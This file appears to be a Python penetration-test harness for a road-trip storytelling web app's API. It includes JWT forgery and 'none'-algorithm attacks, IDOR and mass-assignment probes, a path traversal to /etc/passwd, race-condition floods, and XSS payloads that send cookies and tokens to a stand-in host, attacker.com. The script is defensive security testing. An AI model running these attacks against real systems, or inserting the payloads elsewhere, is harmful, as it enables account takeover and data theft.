#!/usr/bin/env python3
"""
Penetration Testing Scenarios for AI Road Trip Storyteller
Advanced attack scenarios simulating real-world threats
"""

import requests
import json
import time
import random
import string
import base64
import hashlib
import hmac
from datetime import datetime, timedelta
import jwt
import asyncio
import aiohttp
from typing import Dict, List, Optional
from colorama import init, Fore, Style
import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# Initialize colorama
init(autoreset=True)

class PenetrationTester:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.results = []
        
        # Attack credentials
        self.attacker_email = f"attacker_{random.randint(1000, 9999)}@evil.com"
        self.victim_email = f"victim_{random.randint(1000, 9999)}@innocent.com"
        self.attacker_token = None
        self.victim_token = None
        
    def setup_test_users(self):
        """Create attacker and victim users"""
        print(f"\n{Fore.YELLOW}[*] Setting up test users...")
        
        # Create victim user
        try:
            response = self.session.post(
                f"{self.base_url}/api/auth/register",
                json={
                    "email": self.victim_email,
                    "password": "Victim@Pass123",
                    "full_name": "Innocent Victim"
                }
            )
            
            if response.status_code == 200:
                self.victim_token = response.json().get("access_token")
                print(f"{Fore.GREEN}[✓] Victim user created")
                
                # Create some victim data
                victim_session = requests.Session()
                victim_session.headers["Authorization"] = f"Bearer {self.victim_token}"
                
                # Create a story
                victim_session.post(
                    f"{self.base_url}/api/stories",
                    json={
                        "title": "My Private Journey",
                        "content": "Secret vacation plans with credit card info: 4111-1111-1111-1111",
                        "is_private": True
                    }
                )
                
                # Create a reservation
                victim_session.post(
                    f"{self.base_url}/api/reservations",
                    json={
                        "venue": "Expensive Restaurant",
                        "date": "2024-12-25",
                        "party_size": 2
                    }
                )
                
        except Exception as e:
            print(f"{Fore.RED}[✗] Failed to create victim: {e}")
            
        # Create attacker user
        try:
            response = self.session.post(
                f"{self.base_url}/api/auth/register",
                json={
                    "email": self.attacker_email,
                    "password": "Attacker@Pass123",
                    "full_name": "Evil Attacker"
                }
            )
            
            if response.status_code == 200:
                self.attacker_token = response.json().get("access_token")
                self.session.headers["Authorization"] = f"Bearer {self.attacker_token}"
                print(f"{Fore.GREEN}[✓] Attacker user created")
                
        except Exception as e:
            print(f"{Fore.RED}[✗] Failed to create attacker: {e}")
            
    # Scenario 1: User Impersonation Attack
    def test_user_impersonation(self):
        """Attempt to impersonate another user"""
        print(f"\n{Fore.CYAN}[SCENARIO 1] User Impersonation Attack")
        print(f"{Fore.CYAN}{'-'*50}")
        
        attacks_successful = []
        
        # Attack 1: Try to modify Authorization header to access victim's data
        print(f"\n{Fore.YELLOW}[*] Attempting JWT manipulation...")
        
        if self.attacker_token and self.victim_token:
            # Decode tokens without verification
            try:
                attacker_payload = jwt.decode(self.attacker_token, options={"verify_signature": False})
                victim_payload = jwt.decode(self.victim_token, options={"verify_signature": False})
                
                # Try to forge a token with victim's subject
                forged_payload = attacker_payload.copy()
                forged_payload["sub"] = victim_payload["sub"]
                
                # Try common secrets
                common_secrets = ["secret", "dev-secret", "123456", "password", "admin", "test"]
                
                for secret in common_secrets:
                    try:
                        forged_token = jwt.encode(forged_payload, secret, algorithm="HS256")
                        
                        # Test forged token
                        test_session = requests.Session()
                        test_session.headers["Authorization"] = f"Bearer {forged_token}"
                        
                        response = test_session.get(f"{self.base_url}/api/users/me")
                        if response.status_code == 200:
                            data = response.json()
                            if data.get("email") == self.victim_email:
                                attacks_successful.append(f"JWT forged with weak secret: {secret}")
                                
                    except Exception:
                        pass
                        
            except Exception as e:
                print(f"{Fore.YELLOW}    JWT manipulation failed: {e}")
                
        # Attack 2: IDOR (Insecure Direct Object Reference)
        print(f"\n{Fore.YELLOW}[*] Testing IDOR vulnerabilities...")
        
        # Try to access victim's resources directly
        idor_endpoints = [
            "/api/users/{user_id}",
            "/api/stories/{story_id}",
            "/api/reservations/{reservation_id}",
            "/api/preferences/{user_id}"
        ]
        
        for endpoint_template in idor_endpoints:
            # Try common ID patterns
            for test_id in ["1", "2", "3", str(random.randint(1, 100))]:
                endpoint = endpoint_template.format(
                    user_id=test_id,
                    story_id=test_id,
                    reservation_id=test_id
                )
                
                try:
                    response = self.session.get(f"{self.base_url}{endpoint}")
                    
                    if response.status_code == 200:
                        data = response.json()
                        # Check if we accessed someone else's data
                        if "email" in str(data) and self.attacker_email not in str(data):
                            attacks_successful.append(f"IDOR vulnerability at {endpoint}")
                            
                except Exception:
                    pass
                    
        # Attack 3: Session/Cookie manipulation
        print(f"\n{Fore.YELLOW}[*] Attempting session manipulation...")
        
        # Try to reuse victim's session
        if self.victim_token:
            # Simulate stolen token scenario
            stolen_session = requests.Session()
            stolen_session.headers["Authorization"] = f"Bearer {self.victim_token}"
            
            try:
                # Try to use stolen token from different IP (simulated by user-agent)
                stolen_session.headers["User-Agent"] = "EvilBot/1.0"
                
                response = stolen_session.get(f"{self.base_url}/api/users/me")
                if response.status_code == 200:
                    attacks_successful.append("Token replay attack successful (no IP binding)")
                    
            except Exception:
                pass
                
        # Results
        if attacks_successful:
            print(f"\n{Fore.RED}[✗] User impersonation VULNERABLE:")
            for attack in attacks_successful:
                print(f"    - {attack}")
        else:
            print(f"\n{Fore.GREEN}[✓] User impersonation properly protected")
            
        self.results.append({
            "scenario": "User Impersonation",
            "vulnerable": len(attacks_successful) > 0,
            "details": attacks_successful
        })
        
    # Scenario 2: Privilege Escalation Attack
    def test_privilege_escalation_advanced(self):
        """Advanced privilege escalation attempts"""
        print(f"\n{Fore.CYAN}[SCENARIO 2] Privilege Escalation Attack")
        print(f"{Fore.CYAN}{'-'*50}")
        
        attacks_successful = []
        
        # Attack 1: Mass assignment vulnerability
        print(f"\n{Fore.YELLOW}[*] Testing mass assignment...")
        
        privilege_fields = [
            {"role": "admin"},
            {"is_admin": True},
            {"is_premium": True},
            {"permissions": ["admin", "super_admin"]},
            {"user_type": "administrator"},
            {"access_level": 99}
        ]
        
        for fields in privilege_fields:
            try:
                response = self.session.patch(
                    f"{self.base_url}/api/users/me",
                    json=fields
                )
                
                if response.status_code == 200:
                    # Check if privilege was actually elevated
                    check_response = self.session.get(f"{self.base_url}/api/users/me")
                    if check_response.status_code == 200:
                        user_data = check_response.json()
                        
                        for field, value in fields.items():
                            if field in user_data and user_data[field] == value:
                                attacks_successful.append(f"Mass assignment: {field} = {value}")
                                
            except Exception:
                pass
                
        # Attack 2: HTTP Parameter Pollution
        print(f"\n{Fore.YELLOW}[*] Testing parameter pollution...")
        
        try:
            # Try to pollute role parameter
            response = self.session.post(
                f"{self.base_url}/api/users/update",
                json={"name": "Test"},
                params={"role": "admin", "role[]": "admin", "roles": ["admin"]}
            )
            
            if response.status_code == 200:
                attacks_successful.append("HTTP parameter pollution possible")
                
        except Exception:
            pass
            
        # Attack 3: JWT claim manipulation
        print(f"\n{Fore.YELLOW}[*] Testing JWT claim manipulation...")
        
        if self.attacker_token:
            try:
                # Try "none" algorithm attack
                header = {"alg": "none", "typ": "JWT"}
                payload = jwt.decode(self.attacker_token, options={"verify_signature": False})
                payload["role"] = "admin"
                
                # Create token with no signature
                token_parts = [
                    base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("="),
                    base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("="),
                    ""
                ]
                
                forged_token = ".".join(token_parts)
                
                # Test forged token
                test_session = requests.Session()
                test_session.headers["Authorization"] = f"Bearer {forged_token}"
                
                response = test_session.get(f"{self.base_url}/api/admin/users")
                if response.status_code == 200:
                    attacks_successful.append("JWT 'none' algorithm attack successful")
                    
            except Exception:
                pass
                
        # Attack 4: Race condition for privilege escalation
        print(f"\n{Fore.YELLOW}[*] Testing race condition attacks...")
        
        async def race_condition_attack():
            async with aiohttp.ClientSession() as session:
                headers = {"Authorization": f"Bearer {self.attacker_token}"}
                
                # Send multiple concurrent requests to exploit race conditions
                tasks = []
                for _ in range(50):
                    # Try to upgrade to premium simultaneously
                    task1 = session.post(
                        f"{self.base_url}/api/users/upgrade-premium",
                        headers=headers
                    )
                    # Try to use premium feature
                    task2 = session.get(
                        f"{self.base_url}/api/premium/features",
                        headers=headers
                    )
                    
                    tasks.extend([task1, task2])
                    
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Check if any premium features were accessed
                premium_accessed = sum(1 for r in responses 
                                     if not isinstance(r, Exception) and r.status == 200)
                
                if premium_accessed > 0:
                    attacks_successful.append(f"Race condition: accessed premium {premium_accessed} times")
                    
        try:
            asyncio.run(race_condition_attack())
        except Exception:
            pass
            
        # Results
        if attacks_successful:
            print(f"\n{Fore.RED}[✗] Privilege escalation VULNERABLE:")
            for attack in attacks_successful:
                print(f"    - {attack}")
        else:
            print(f"\n{Fore.GREEN}[✓] Privilege escalation properly protected")
            
        self.results.append({
            "scenario": "Privilege Escalation",
            "vulnerable": len(attacks_successful) > 0,
            "details": attacks_successful
        })
        
    # Scenario 3: Data Exfiltration Attack
    def test_data_exfiltration(self):
        """Attempt to extract sensitive data"""
        print(f"\n{Fore.CYAN}[SCENARIO 3] Data Exfiltration Attack")
        print(f"{Fore.CYAN}{'-'*50}")
        
        sensitive_data_found = []
        
        # Attack 1: GraphQL introspection (if available)
        print(f"\n{Fore.YELLOW}[*] Testing GraphQL introspection...")
        
        graphql_query = {
            "query": """
            {
                __schema {
                    types {
                        name
                        fields {
                            name
                            type {
                                name
                            }
                        }
                    }
                }
            }
            """
        }
        
        try:
            response = self.session.post(
                f"{self.base_url}/graphql",
                json=graphql_query
            )
            
            if response.status_code == 200:
                sensitive_data_found.append("GraphQL introspection enabled")
                
        except Exception:
            pass
            
        # Attack 2: API enumeration
        print(f"\n{Fore.YELLOW}[*] Enumerating API endpoints...")
        
        # Common API patterns to test
        api_patterns = [
            "/api/v1/users/all",
            "/api/v1/users/export",
            "/api/v1/database/dump",
            "/api/v1/admin/backup",
            "/api/internal/users",
            "/api/debug/users",
            "/api/.git/config",
            "/api/config/database",
            "/api/logs/access.log"
        ]
        
        for pattern in api_patterns:
            try:
                response = self.session.get(f"{self.base_url}{pattern}")
                
                if response.status_code == 200:
                    # Check if response contains sensitive data
                    content = response.text.lower()
                    if any(sensitive in content for sensitive in 
                          ["password", "credit_card", "ssn", "api_key", "secret"]):
                        sensitive_data_found.append(f"Sensitive data at {pattern}")
                        
            except Exception:
                pass
                
        # Attack 3: Blind data extraction via timing attacks
        print(f"\n{Fore.YELLOW}[*] Testing blind extraction...")
        
        # Test if we can infer data through response times
        try:
            # Baseline request
            start = time.time()
            self.session.get(f"{self.base_url}/api/users/search?email=nonexistent@test.com")
            baseline_time = time.time() - start
            
            # Test with wildcard
            start = time.time()
            self.session.get(f"{self.base_url}/api/users/search?email=%25")  # SQL wildcard
            wildcard_time = time.time() - start
            
            # If wildcard takes significantly longer, might indicate vulnerability
            if wildcard_time > baseline_time * 2:
                sensitive_data_found.append("Possible blind SQL injection via timing")
                
        except Exception:
            pass
            
        # Attack 4: Backup file discovery
        print(f"\n{Fore.YELLOW}[*] Searching for backup files...")
        
        backup_patterns = [
            "/backup.sql",
            "/db_backup.zip",
            "/.env.backup",
            "/config.json.bak",
            "/api/backup.tar.gz",
            "/dump.sql",
            "/.git/",
            "/.svn/",
            "/wp-config.php.bak"
        ]
        
        for pattern in backup_patterns:
            try:
                response = self.session.get(f"{self.base_url}{pattern}")
                
                if response.status_code == 200:
                    sensitive_data_found.append(f"Backup file exposed: {pattern}")
                    
            except Exception:
                pass
                
        # Attack 5: Information leakage through error messages
        print(f"\n{Fore.YELLOW}[*] Testing error-based extraction...")
        
        # Trigger various errors to see what information leaks
        error_triggers = [
            ("POST", "/api/invalid", {"invalid_json": "}"}),
            ("GET", "/api/users/../../etc/passwd", None),
            ("GET", "/api/users/0", None),
            ("GET", "/api/users/-1", None),
            ("GET", "/api/users/99999999", None)
        ]
        
        for method, endpoint, data in error_triggers:
            try:
                if method == "POST":
                    response = self.session.post(f"{self.base_url}{endpoint}", json=data)
                else:
                    response = self.session.get(f"{self.base_url}{endpoint}")
                    
                # Check for information in error response
                if response.status_code >= 400:
                    error_text = response.text.lower()
                    
                    # Look for sensitive information patterns
                    if any(pattern in error_text for pattern in 
                          ["sql", "postgres", "mysql", "table", "column", 
                           "traceback", "stack", "line ", "file "]):
                        sensitive_data_found.append(f"Information leak in error at {endpoint}")
                        
            except Exception:
                pass
                
        # Results
        if sensitive_data_found:
            print(f"\n{Fore.RED}[✗] Data exfiltration VULNERABLE:")
            for data in sensitive_data_found:
                print(f"    - {data}")
        else:
            print(f"\n{Fore.GREEN}[✓] Data properly protected from exfiltration")
            
        self.results.append({
            "scenario": "Data Exfiltration",
            "vulnerable": len(sensitive_data_found) > 0,
            "details": sensitive_data_found
        })
        
    # Scenario 4: Session Hijacking Attack
    def test_session_hijacking(self):
        """Attempt session hijacking attacks"""
        print(f"\n{Fore.CYAN}[SCENARIO 4] Session Hijacking Attack")
        print(f"{Fore.CYAN}{'-'*50}")
        
        attacks_successful = []
        
        # Attack 1: Session fixation
        print(f"\n{Fore.YELLOW}[*] Testing session fixation...")
        
        if self.victim_token:
            # Try to force victim to use attacker's session
            try:
                # Create a new session
                fixed_session = requests.Session()
                
                # Try to set session ID in various ways
                fixed_session.cookies.set("session_id", "attacker_controlled_session")
                fixed_session.headers["X-Session-ID"] = "attacker_controlled_session"
                
                # Attempt login with fixed session
                response = fixed_session.post(
                    f"{self.base_url}/api/auth/login",
                    data={
                        "username": self.victim_email,
                        "password": "Victim@Pass123"
                    }
                )
                
                if response.status_code == 200:
                    # Check if session ID remained the same
                    if "attacker_controlled_session" in str(fixed_session.cookies):
                        attacks_successful.append("Session fixation vulnerability")
                        
            except Exception:
                pass
                
        # Attack 2: Cross-site scripting for session theft
        print(f"\n{Fore.YELLOW}[*] Testing XSS-based session theft...")
        
        # Craft XSS payloads that would steal sessions
        xss_payloads = [
            "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
            "<img src=x onerror=\"new Image().src='http://attacker.com/steal?c='+localStorage.getItem('token')\">",
            "<script>navigator.sendBeacon('http://attacker.com/steal', JSON.stringify({token: localStorage.token}))</script>"
        ]
        
        for payload in xss_payloads:
            try:
                # Try to inject in various places
                response = self.session.post(
                    f"{self.base_url}/api/comments",
                    json={"content": payload}
                )
                
                if response.status_code == 200:
                    # Check if payload is reflected without encoding
                    check_response = self.session.get(f"{self.base_url}/api/comments")
                    if payload in check_response.text:
                        attacks_successful.append(f"XSS session theft possible: {payload[:50]}...")
                        
            except Exception:
                pass
                
        # Attack 3: Man-in-the-middle token interception
        print(f"\n{Fore.YELLOW}[*] Testing token security...")
        
        # Check if tokens are transmitted securely
        insecure_indicators = []
        
        # Check for secure flag on cookies
        if hasattr(self.session.cookies, '_cookies'):
            for cookie in self.session.cookies:
                if not cookie.secure:
                    insecure_indicators.append(f"Cookie '{cookie.name}' missing Secure flag")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    insecure_indicators.append(f"Cookie '{cookie.name}' missing HttpOnly flag")
                    
        if insecure_indicators:
            attacks_successful.extend(insecure_indicators)
            
        # Attack 4: Token prediction
        print(f"\n{Fore.YELLOW}[*] Testing token predictability...")
        
        # Collect multiple tokens to analyze patterns
        tokens = []
        
        for i in range(5):
            try:
                # Create a new user
                temp_email = f"temp_{i}_{random.randint(1000, 9999)}@test.com"
                response = self.session.post(
                    f"{self.base_url}/api/auth/register",
                    json={
                        "email": temp_email,
                        "password": "TempPass123!",
                        "full_name": "Temp User"
                    }
                )
                
                if response.status_code == 200:
                    token = response.json().get("access_token")
                    if token:
                        tokens.append(token)
                        
            except Exception:
                pass
                
        # Analyze tokens for patterns
        if len(tokens) >= 3:
            # Check if tokens have predictable components
            token_parts = [jwt.decode(t, options={"verify_signature": False}) for t in tokens]
            
            # Check for sequential IDs or predictable patterns
            if all("jti" in part for part in token_parts):
                jtis = [part["jti"] for part in token_parts]
                
                # Simple check for sequential patterns
                try:
                    # If JTIs are numeric and sequential
                    numeric_jtis = [int(jti) for jti in jtis if jti.isdigit()]
                    if len(numeric_jtis) >= 2:
                        differences = [numeric_jtis[i+1] - numeric_jtis[i] 
                                     for i in range(len(numeric_jtis)-1)]
                        
                        if all(d == differences[0] for d in differences):
                            attacks_successful.append("Token JTIs are predictable (sequential)")
                except:
                    pass
                    
        # Results
        if attacks_successful:
            print(f"\n{Fore.RED}[✗] Session hijacking VULNERABLE:")
            for attack in attacks_successful:
                print(f"    - {attack}")
        else:
            print(f"\n{Fore.GREEN}[✓] Sessions properly protected from hijacking")
            
        self.results.append({
            "scenario": "Session Hijacking",
            "vulnerable": len(attacks_successful) > 0,
            "details": attacks_successful
        })
        
    # Scenario 5: API Abuse Attack
    def test_api_abuse(self):
        """Test for API abuse vulnerabilities"""
        print(f"\n{Fore.CYAN}[SCENARIO 5] API Abuse Attack")
        print(f"{Fore.CYAN}{'-'*50}")
        
        vulnerabilities = []
        
        # Attack 1: Resource exhaustion
        print(f"\n{Fore.YELLOW}[*] Testing resource exhaustion...")
        
        # Try to create excessive data
        resource_endpoints = [
            ("/api/stories", {"title": "A" * 10000, "content": "B" * 1000000}),
            ("/api/comments", {"content": "C" * 50000}),
            ("/api/upload", {"filename": "../" * 100 + "evil.txt"})
        ]
        
        for endpoint, payload in resource_endpoints:
            try:
                response = self.session.post(f"{self.base_url}{endpoint}", json=payload)
                
                if response.status_code == 200:
                    vulnerabilities.append(f"No size limits on {endpoint}")
                elif response.status_code == 500:
                    vulnerabilities.append(f"DoS possible on {endpoint}")
                    
            except Exception:
                pass
                
        # Attack 2: Business logic abuse
        print(f"\n{Fore.YELLOW}[*] Testing business logic flaws...")
        
        # Try negative values
        try:
            response = self.session.post(
                f"{self.base_url}/api/reservations",
                json={
                    "venue": "Test Restaurant",
                    "date": "2024-12-25",
                    "party_size": -5
                }
            )
            
            if response.status_code == 200:
                vulnerabilities.append("Negative party size accepted")
                
        except Exception:
            pass
            
        # Try to book in the past
        past_date = (datetime.now() - timedelta(days=30)).strftime("%Y-%m-%d")
        try:
            response = self.session.post(
                f"{self.base_url}/api/reservations",
                json={
                    "venue": "Test Restaurant",
                    "date": past_date,
                    "party_size": 2
                }
            )
            
            if response.status_code == 200:
                vulnerabilities.append("Past date bookings allowed")
                
        except Exception:
            pass
            
        # Attack 3: API parameter tampering
        print(f"\n{Fore.YELLOW}[*] Testing parameter tampering...")
        
        # Try to manipulate pricing/commission
        tamper_attempts = [
            {"commission_rate": 0.99},  # Try to set high commission
            {"price": 0.01},  # Try to set low price
            {"discount": 100},  # Try to set 100% discount
            {"referral_bonus": 1000}  # Try to add referral bonus
        ]
        
        for tamper_payload in tamper_attempts:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/bookings",
                    json={
                        "service": "restaurant",
                        "venue_id": "test_venue",
                        **tamper_payload
                    }
                )
                
                if response.status_code == 200:
                    data = response.json()
                    for key, value in tamper_payload.items():
                        if key in str(data) and value in str(data):
                            vulnerabilities.append(f"Parameter tampering successful: {key}")
                            
            except Exception:
                pass
                
        # Attack 4: Concurrent request abuse
        print(f"\n{Fore.YELLOW}[*] Testing race conditions...")
        
        async def concurrent_abuse():
            async with aiohttp.ClientSession() as session:
                headers = {"Authorization": f"Bearer {self.attacker_token}"}
                
                # Try to claim the same reward multiple times
                reward_tasks = []
                for _ in range(20):
                    task = session.post(
                        f"{self.base_url}/api/rewards/claim",
                        json={"reward_id": "welcome_bonus"},
                        headers=headers
                    )
                    reward_tasks.append(task)
                    
                responses = await asyncio.gather(*reward_tasks, return_exceptions=True)
                
                successful_claims = sum(1 for r in responses 
                                      if not isinstance(r, Exception) and r.status == 200)
                
                if successful_claims > 1:
                    vulnerabilities.append(f"Race condition: claimed reward {successful_claims} times")
                    
        try:
            asyncio.run(concurrent_abuse())
        except Exception:
            pass
            
        # Results
        if vulnerabilities:
            print(f"\n{Fore.RED}[✗] API abuse VULNERABLE:")
            for vuln in vulnerabilities:
                print(f"    - {vuln}")
        else:
            print(f"\n{Fore.GREEN}[✓] API properly protected from abuse")
            
        self.results.append({
            "scenario": "API Abuse",
            "vulnerable": len(vulnerabilities) > 0,
            "details": vulnerabilities
        })
        
    def print_summary(self):
        """Print penetration test summary"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}Penetration Test Summary")
        print(f"{Fore.CYAN}{'='*60}")
        
        total_scenarios = len(self.results)
        vulnerable_scenarios = sum(1 for r in self.results if r["vulnerable"])
        
        print(f"\nTotal Scenarios: {total_scenarios}")
        print(f"{Fore.RED}Vulnerable: {vulnerable_scenarios}")
        print(f"{Fore.GREEN}Secure: {total_scenarios - vulnerable_scenarios}")
        
        if vulnerable_scenarios > 0:
            print(f"\n{Fore.RED}Vulnerable Scenarios:")
            for result in self.results:
                if result["vulnerable"]:
                    print(f"\n  {result['scenario']}:")
                    for detail in result["details"]:
                        print(f"    - {detail}")
                        
        # Risk assessment
        if vulnerable_scenarios == 0:
            risk_level = "LOW"
            risk_color = Fore.GREEN
        elif vulnerable_scenarios <= 2:
            risk_level = "MEDIUM"
            risk_color = Fore.YELLOW
        else:
            risk_level = "HIGH"
            risk_color = Fore.RED
            
        print(f"\n{risk_color}Overall Risk Level: {risk_level}")
        
        # Save results
        with open("penetration_test_results.json", "w") as f:
            json.dump({
                "summary": {
                    "total_scenarios": total_scenarios,
                    "vulnerable": vulnerable_scenarios,
                    "risk_level": risk_level,
                    "timestamp": datetime.now().isoformat()
                },
                "scenarios": self.results
            }, f, indent=2)
            
        print(f"\nResults saved to: penetration_test_results.json")
        
    def run_all_scenarios(self):
        """Run all penetration test scenarios"""
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}AI Road Trip Penetration Testing")
        print(f"{Fore.CYAN}Target: {self.base_url}")
        print(f"{Fore.CYAN}{'='*60}")
        
        # Setup
        self.setup_test_users()
        
        # Run scenarios
        self.test_user_impersonation()
        self.test_privilege_escalation_advanced()
        self.test_data_exfiltration()
        self.test_session_hijacking()
        self.test_api_abuse()
        
        # Summary
        self.print_summary()


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Penetration Testing for AI Road Trip")
    parser.add_argument("--url", default="http://localhost:8000", help="Base URL to test")
    parser.add_argument("--scenario", help="Run specific scenario only")
    
    args = parser.parse_args()
    
    tester = PenetrationTester(args.url)
    
    if args.scenario:
        # Map scenario names to methods
        scenarios = {
            "impersonation": tester.test_user_impersonation,
            "privilege": tester.test_privilege_escalation_advanced,
            "exfiltration": tester.test_data_exfiltration,
            "hijacking": tester.test_session_hijacking,
            "abuse": tester.test_api_abuse
        }
        
        if args.scenario in scenarios:
            tester.setup_test_users()
            scenarios[args.scenario]()
            tester.print_summary()
        else:
            print(f"{Fore.RED}Unknown scenario: {args.scenario}")
            print("Available scenarios: impersonation, privilege, exfiltration, hijacking, abuse")
    else:
        # Run all scenarios
        tester.run_all_scenarios()


if __name__ == "__main__":
    main()